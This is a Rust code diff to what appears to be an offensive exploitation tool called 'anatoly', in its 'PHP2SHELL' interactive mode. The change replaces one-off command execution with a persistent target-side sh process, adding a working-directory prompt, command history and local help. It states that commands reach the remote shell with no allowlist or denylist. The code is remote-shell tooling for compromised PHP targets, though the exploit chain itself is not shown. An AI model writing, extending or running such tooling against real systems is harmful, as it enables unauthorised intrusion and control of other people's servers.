@@ -110,6 +110,8 @@ fn prepare(args: &ExploitArgs, json: bool, ui: &Ui) -> Result<PreparedExecution>
 
 fn interactive(args: ExploitArgs, ui: &Ui) -> Result<u8> {
     let prepared = prepare(&args, false, ui)?;
+    let mut shell =
+        anatoly::exploit_session::PersistentShell::start(&prepared.backend, &prepared.target)?;
     ui.details(
         "ANATOLY / PHP2SHELL SESSION",
         &serde_json::json!({
@@ -117,14 +119,16 @@ fn interactive(args: ExploitArgs, ui: &Ui) -> Result<u8> {
             "php_version": prepared.profile.php_version,
             "profile": prepared.profile.name,
             "forced": prepared.forced,
-            "command_policy": "Commands are passed to the shell without an allowlist or denylist",
-            "session": "The scanner selected one exact profile. Each command reruns the chain and requires fresh proof. Type exit to stop.",
-            "persistent_shell": false,
+            "command_policy": "Commands are passed to the persistent shell without an allowlist or denylist",
+            "session": "One target-side sh process preserves cwd and environment. Type help for local commands.",
+            "persistent_shell": true,
+            "tty": false,
         }),
     );
     let stdin = io::stdin();
+    let mut history = Vec::<String>::new();
     loop {
-        print!("anatoly$ ");
+        print!("anatoly:{}$ ", shell.cwd());
         io::stdout().flush()?;
         let mut input = String::new();
         if stdin.read_line(&mut input)? == 0 {
@@ -132,31 +136,40 @@ fn interactive(args: ExploitArgs, ui: &Ui) -> Result<u8> {
             break;
         }
         let input = input.trim();
-        if input == "exit" {
-            break;
+        match input {
+            "" => continue,
+            "exit" | "quit" => break,
+            "help" => {
+                println!("Remote commands run in the same persistent target-side sh process.");
+                println!("Local commands: help, history, clear, exit, quit");
+                continue;
+            }
+            "history" => {
+                for (index, command) in history.iter().enumerate() {
+                    println!("{:>4}  {}", index + 1, safe_text(command));
+                }
+                continue;
+            }
+            "clear" => {
+                print!("\x1b[2J\x1b[H");
+                io::stdout().flush()?;
+                continue;
+            }
+            _ => {}
         }
-        if input.is_empty() {
-            continue;
-        }
-        if let Err(error) = interactive_command(input, &prepared, ui) {
-            eprintln!("anatoly: {}", safe_text(&format!("{error:#}")));
+        history.push(input.to_owned());
+        match shell.execute(input) {
+            Ok(result) => {
+                if !result.proof.output.is_empty() {
+                    println!("{}", safe_text(&result.proof.output));
+                }
+                if result.exit_status != 0 {
+                    eprintln!("anatoly: remote exit status {}", result.exit_status);
+                }
+            }
+            Err(error) => eprintln!("anatoly: {}", safe_text(&format!("{error:#}"))),
         }
     }
+    shell.close()?;
     Ok(0)
-}
-
-fn interactive_command(input: &str, prepared: &PreparedExecution, ui: &Ui) -> Result<()> {
-    let proof = prepared
-        .backend
-        .execute(&prepared.target, input.to_owned())?;
-    let report = ExploitReport::new(
-        ExploitMode::Connect,
-        &prepared.target,
-        &prepared.profile,
-        proof,
-        prepared.forced,
-        &prepared.scan,
-    );
-    ui.details("ANATOLY / PHP2SHELL PROOF", &serde_json::to_value(&report)?);
-    Ok(())
 }
